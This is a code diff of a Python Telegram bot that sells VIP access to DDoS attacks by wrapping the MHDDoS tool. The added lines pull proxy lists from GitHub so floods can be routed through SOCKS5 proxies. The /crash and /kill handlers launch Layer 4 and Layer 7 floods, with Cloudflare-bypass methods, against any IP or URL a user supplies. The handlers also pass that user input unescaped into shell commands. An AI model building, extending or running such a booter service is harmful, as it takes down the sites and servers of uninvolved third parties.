@@ -17,7 +17,9 @@ ALLOWED_USERS = [5705487207]
 vip_users = {}
 active_attacks = {}
 
-# Function to check if the target is Down
+# Standard Proxy URL (SOCKS5/SOCKS4/HTTP)
+PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
+
 def check_target_status(target):
     """Checks if the target is responding or down."""
     try:
@@ -29,7 +31,7 @@ def check_target_status(target):
         end_time = time.time()
         
         if response.status_code == 200:
-            return f"UP ✅ (Response: {int((end_time - start_time) * 1000)}ms)"
+            return f"UP ✅ ({int((end_time - start_time) * 1000)}ms)"
         else:
             return f"UNSTABLE ⚠️ (Code: {response.status_code})"
     except:
@@ -43,36 +45,35 @@ def handle_start_command(message):
         status = "VIP MEMBER" if days_left > 0 else "REGULAR USER"
 
         text = (
-            f"🤖 *WELCOME TO THE MHDDoS CLOUD*\n\n"
-            f"> *ID:* `{user_id}`\n"
+            f"🤖 *WELCOME TO MHDDoS CLOUD*\n\n"
+            f"> *USER ID:* `{user_id}`\n"
             f"> *STATUS:* `{status}`\n"
             f"> *EXPIRY:* `{days_left} Days`\n\n"
-            f"📌 *COMMANDS:*\n"
+            f"📌 *COMMAND USAGE:*\n"
             f"<blockquote>/crash <METHOD> <IP:PORT> <THREADS> <MS></blockquote>\n"
-            f"<blockquote>/kill <URL> (L7 Auto Attack)</blockquote>\n\n"
-            f"💡 *EXAMPLE:* `/crash UDP 1.1.1.1:80 10 600`"
+            f"<blockquote>/kill <URL> (Auto Proxy L7)</blockquote>\n\n"
+            f"💡 *PRO TIP:* Use `CFB` for Cloudflare sites\."
         )
 
         markup = InlineKeyboardMarkup()
         creator_button = InlineKeyboardButton("📱 CREATOR", url="https://t.me/MR3SKR")
-        methods_button = InlineKeyboardButton("📜 ALL METHODS", callback_data="show_methods")
+        methods_button = InlineKeyboardButton("📜 METHODS LIST", callback_data="show_methods")
         markup.add(creator_button, methods_button)
 
         bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
     except Exception as e:
-        print(f"Error in start: {e}")
+        print(f"Error: {e}")
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_methods")
 def show_methods(call):
     methods_text = (
-        f"🛡️ *MHDDoS POWERFUL METHODS*\n\n"
-        f"🚀 *LAYER 7 (HTTPS/HTTP):*\n"
-        f"<blockquote>GET, POST, OVH, RHEX, STOMP, BYPASS, DYN, SLOW, BOMB, CFB, CFBUAM, KILLER</blockquote>\n\n"
-        f"⚔️ *LAYER 4 (TCP/UDP/VSE):*\n"
-        f"<blockquote>TCP, UDP, SYN, VSE, MEM, DNS, NTP, ARD, RDP, ICMP, MINECRAFT, TS3</blockquote>\n\n"
-        f"📌 *TIPS:* Use `BYPASS` for Cloudflare targets."
+        f"🛡️ *MHDDoS POWER METHODS*\n\n"
+        f"🚀 *LAYER 7 (Web Browsers):*\n"
+        f"<blockquote>CFB, CFBUAM, BYPASS, GET, POST, OVH, STOMP, SLOW</blockquote>\n\n"
+        f"⚔️ *LAYER 4 (Servers/IPs):*\n"
+        f"<blockquote>UDP, TCP, SYN, VSE, CONNECTION, MINECRAFT, TS3</blockquote>\n\n"
+        f"🔗 *PROXIES:* Automatically fetched from GitHub\."
     )
-    # Add a back button
     markup = InlineKeyboardMarkup()
     back_btn = InlineKeyboardButton("⬅️ BACK", callback_data="back_to_start")
     markup.add(back_btn)
@@ -89,99 +90,88 @@ def handle_crash_command(message):
     try:
         user_id = message.from_user.id
         if vip_users.get(user_id, 0) <= 0:
-            bot.reply_to(message, "🚫 *ERROR:* YOU ARE NOT A VIP USER!")
+            bot.reply_to(message, "🚫 *ACCESS DENIED:* VIP STATUS REQUIRED!")
             return
 
-        command_parts = message.text.split()
-        if len(command_parts) < 5:
-            bot.reply_to(message, "⚠️ *USAGE:* `/crash <TYPE> <IP:PORT> <THREADS> <MS>`", parse_mode="Markdown")
+        parts = message.text.split()
+        if len(parts) < 5:
+            bot.reply_to(message, "⚠️ *USAGE:* `/crash <METHOD> <IP:PORT> <THREADS> <MS>`")
             return
 
-        attack_type, ip_port, threads, duration = command_parts[1:5]
+        method, target, threads, duration = parts[1:5]
         
-        # Checking Target BEFORE Attack
-        initial_status = check_target_status(ip_port)
+        # Checking target status before attack
+        initial_status = check_target_status(target)
 
-        # Executing MHDDoS
-        command = f'python3 start.py {attack_type} {ip_port} {threads} {duration}'
+        # Logic: If proxy file not found, MHDDoS downloads it automatically
+        # We pass 5 as socks_type (SOCKS5) and the URL for proxylist
+        command = f"python3 start.py {method} {target} 5 {threads} {PROXY_URL} 10 {duration}"
+        
         process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
         
-        if user_id not in active_attacks:
-            active_attacks[user_id] = {}
-        active_attacks[user_id][ip_port] = process
+        if user_id not in active_attacks: active_attacks[user_id] = {}
+        active_attacks[user_id][target] = process
 
         response = (
-            f"🚀 *ATTACK IN PROGRESS*\n\n"
-            f"> *TARGET:* `{ip_port}`\n"
-            f"> *METHOD:* `{attack_type}`\n"
-            f"> *INITIAL STATUS:* {initial_status}\n"
-            f"> *TIME:* `{duration}ms`\n\n"
-            f"💡 *TIP:* Wait 30s then check target again."
+            f"🚀 *ATTACK DEPLOYED*\n\n"
+            f"> *TARGET:* `{target}`\n"
+            f"> *METHOD:* `{method}`\n"
+            f"> *STATUS:* {initial_status}\n"
+            f"> *PROXIES:* `Fetching from URL...`\n\n"
+            f"🔴 *STOP THE ATTACK USING BUTTON BELOW*"
         )
 
         markup = InlineKeyboardMarkup()
-        stop_button = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{ip_port}")
-        markup.add(stop_button)
+        stop_btn = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{target}")
+        markup.add(stop_btn)
 
         bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
     except Exception as e:
         bot.reply_to(message, f"SYSTEM ERROR: {str(e)}")
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack'))
+@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
 def stop_attack(call):
-    try:
-        user_id = call.from_user.id
-        ip_port = call.data.replace("stop_attack_", "")
+    user_id = call.from_user.id
+    target = call.data.replace("stop_", "")
 
-        if user_id in active_attacks and ip_port in active_attacks[user_id]:
-            process = active_attacks[user_id][ip_port]
-            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
-            del active_attacks[user_id][ip_port]
-            
-            bot.answer_callback_query(call.id, "ATTACK KILLED!")
-            bot.send_message(call.message.chat.id, f"🛑 *ATTACK STOPPED:* `{ip_port}`", parse_mode="Markdown")
-        else:
-            bot.answer_callback_query(call.id, "NO ACTIVE ATTACK!")
-    except Exception as e:
-        bot.send_message(call.message.chat.id, f"ERROR: {str(e)}")
+    if user_id in active_attacks and target in active_attacks[user_id]:
+        process = active_attacks[user_id][target]
+        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+        del active_attacks[user_id][target]
+        bot.answer_callback_query(call.id, "ATTACK TERMINATED")
+        bot.send_message(call.message.chat.id, f"🛑 *ATTACK STOPPED:* `{target}`", parse_mode="Markdown")
+    else:
+        bot.answer_callback_query(call.id, "NO ACTIVE ATTACK FOUND")
 
 @bot.message_handler(commands=['kill'])
 def handle_kill_command(message):
+    # Layer 7 Auto-Killer
     try:
         user_id = message.from_user.id
-        if user_id not in ALLOWED_USERS and vip_users.get(user_id, 0) <= 0:
-            bot.reply_to(message, "🚫 VIP REQUIRED!")
-            return
-
-        command_parts = message.text.split()
-        if len(command_parts) != 2:
-            bot.reply_to(message, "⚠️ *USAGE:* `/kill <URL>`")
-            return
-
-        target_url = command_parts[1]
+        if vip_users.get(user_id, 0) <= 0: return
         
-        # Auto L7 Attack Logic
-        kill_command = f"python3 start.py KILLER {target_url} 5 100 proxy.txt 100 300"
-        process = subprocess.Popen(kill_command, shell=True, preexec_fn=os.setsid)
+        parts = message.text.split()
+        if len(parts) != 2: return
         
-        status = check_target_status(target_url)
-
-        bot.reply_to(message, f"✅ *L7 KILLER STARTED*\n\n> *TARGET:* {target_url}\n> *STATUS:* {status}", parse_mode="Markdown")
+        target_url = parts[1]
+        # Command with Auto-Proxying
+        cmd = f"python3 start.py KILLER {target_url} 5 100 {PROXY_URL} 100 300"
+        subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
+        
+        bot.reply_to(message, f"✅ *L7 KILLER STARTED*\n\n> *URL:* {target_url}\n> *PROXIES:* Auto-downloading...", parse_mode="Markdown")
     except Exception as e:
         bot.reply_to(message, f"ERROR: {str(e)}")
 
 @bot.message_handler(commands=['addvip'])
 def handle_addvip_command(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        return
+    if message.from_user.id not in ALLOWED_USERS: return
     try:
         _, t_id, days = message.text.split()
         vip_users[int(t_id)] = int(days)
-        bot.reply_to(message, f"⭐ *VIP ADDED:* `{t_id}` for `{days}` days\.")
+        bot.reply_to(message, f"⭐ *VIP SUCCESS:* User `{t_id}` added for `{days}` days\.")
     except:
-        bot.reply_to(message, "⚠️ *USAGE:* `/addvip <ID> <DAYS>`")
+        bot.reply_to(message, "⚠️ `/addvip <ID> <DAYS>`")
 
-# Important for Coolify/Docker
-print("BOT IS RUNNING IN UNBUFFERED MODE...")
+print("BOT DEPLOYED ON COOLIFY...")
 bot.remove_webhook()
 bot.polling(none_stop=True)
